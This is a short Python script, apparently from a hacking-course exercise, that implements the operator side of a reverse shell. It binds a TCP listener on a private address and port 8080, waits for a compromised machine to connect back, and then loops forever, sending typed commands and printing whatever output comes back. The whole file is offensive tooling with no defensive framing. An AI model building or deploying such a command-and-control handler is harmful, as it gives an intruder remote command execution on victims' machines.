import socket

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening .....")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))

    def command_execution(self,command_input):
        self.my_connection.send(command_input)
        return self.my_connection.recv(1024)

    def star_listener(self):
        while True:
            command_input = raw_input("Enter command: ")
            command_output = self.command_execution(command_input)
            print(command_output)

my_socket_listener = SocketListener("192.168.1.217",8080)
my_socket_listener.star_listener()